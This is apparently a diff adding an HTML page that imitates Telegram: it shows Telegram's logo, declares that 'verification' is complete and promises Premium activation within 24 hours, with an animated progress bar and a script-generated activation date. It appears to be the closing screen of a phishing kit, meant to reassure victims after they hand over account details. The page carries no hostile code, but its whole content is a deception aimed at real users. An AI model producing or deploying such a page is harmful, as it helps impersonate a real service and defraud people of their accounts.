@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Premium Activation Success</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #17212b;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #ffffff;
+        }
+        .container {
+            background-color: #1f2936;
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 430px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 1.5rem;
+            filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.2));
+        }
+        .success-icon-container {
+            background: rgba(135, 116, 225, 0.2);
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            position: relative;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(135, 116, 225, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(135, 116, 225, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(135, 116, 225, 0); }
+        }
+        .success-icon {
+            font-size: 42px;
+            color: #8774E1;
+        }
+        h1 {
+            color: #ffffff;
+            margin-bottom: 1.2rem;
+            font-size: 1.8rem;
+            font-weight: 700;
+        }
+        .message {
+            color: #adbac7;
+            margin-bottom: 2.2rem;
+            line-height: 1.6;
+            font-size: 1.1rem;
+        }
+        .premium-badge {
+            background: linear-gradient(135deg, #8774E1, #6454c7);
+            color: white;
+            padding: 0.6rem 1.2rem;
+            border-radius: 30px;
+            display: inline-block;
+            margin-bottom: 1.5rem;
+            font-weight: bold;
+            font-size: 1.1rem;
+            box-shadow: 0 2px 8px rgba(135, 116, 225, 0.4);
+        }
+        .timer {
+            background-color: #2c3847;
+            padding: 1.5rem;
+            border-radius: 10px;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(135, 116, 225, 0.3);
+        }
+        .timer-text {
+            color: #8774E1;
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+        }
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background-color: #374151;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 1rem;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 15%;
+            background: linear-gradient(135deg, #8774E1, #6454c7);
+            animation: progress-animation 24s linear forwards;
+        }
+        @keyframes progress-animation {
+            0% { width: 15%; }
+            100% { width: 100%; }
+        }
+        .note {
+            color: #adbac7;
+            font-size: 0.95rem;
+            margin-top: 2rem;
+            padding: 1rem;
+            background-color: rgba(135, 116, 225, 0.1);
+            border-radius: 8px;
+        }
+        .features {
+            text-align: left;
+            margin: 2rem 0;
+            background-color: #2c3847;
+            padding: 1.2rem;
+            border-radius: 10px;
+        }
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.8rem;
+            color: #d1d5db;
+            font-size: 1.05rem;
+        }
+        .feature-icon {
+            margin-right: 0.8rem;
+            color: #8774E1;
+            background-color: rgba(135, 116, 225, 0.2);
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            font-weight: bold;
+        }
+        .activation-date {
+            font-weight: bold;
+            color: #8774E1;
+        }
+        .shine-effect {
+            position: relative;
+            overflow: hidden;
+        }
+        .shine-effect::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to right, 
+                rgba(255, 255, 255, 0) 0%, 
+                rgba(255, 255, 255, 0.1) 50%, 
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shine 4s infinite;
+        }
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(30deg); }
+            100% { transform: translateX(100%) rotate(30deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="logo">
+        <div class="premium-badge shine-effect">✨ PREMIUM ACTIVATION</div>
+        <div class="success-icon-container">
+            <div class="success-icon">✓</div>
+        </div>
+        <h1>Verification Complete!</h1>
+        <p class="message">Your account has been successfully verified and is now in the queue for Premium activation.</p>
+        
+        <div class="timer">
+            <p class="timer-text">Premium Activation in Progress</p>
+            <p style="color: #adbac7; margin-bottom: 1rem;">Your subscription will be activated shortly. This process typically takes less than 24 hours.</p>
+            <div class="progress-container">
+                <div class="progress-bar"></div>
+            </div>
+        </div>
+        
+        <div class="features">
+            <p style="color: #8774E1; font-weight: bold; margin-bottom: 1rem;">Your Premium Benefits:</p>
+            <div class="feature">
+                <span class="feature-icon">✓</span> 4GB File Upload Size (vs 2GB for normal users)
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> 2x Faster Download Speed
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> Ad-Free Experience
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> Premium Badge & Profile Features
+            </div>
+        </div>
+        
+        <p class="message">
+            You will receive a notification in your Telegram app as soon as your Premium status is activated. Expected activation date: <span class="activation-date" id="activationDate"></span>
+        </p>
+        
+        <p class="note">
+            Thank you for your verification! You can now close this window and continue using Telegram. Your Premium features will be available shortly.
+        </p>
+    </div>
+    
+    <script>
+        // Set activation date to approximately 24 hours from now
+        document.addEventListener('DOMContentLoaded', function() {
+            const now = new Date();
+            const tomorrow = new Date(now);
+            tomorrow.setHours(now.getHours() + 24);
+            
+            const options = { 
+                weekday: 'long', 
+                month: 'short', 
+                day: 'numeric', 
+                hour: '2-digit', 
+                minute: '2-digit' 
+            };
+            
+            document.getElementById('activationDate').textContent = tomorrow.toLocaleDateString('en-US', options);
+        });
+    </script>
+</body>
+</html>
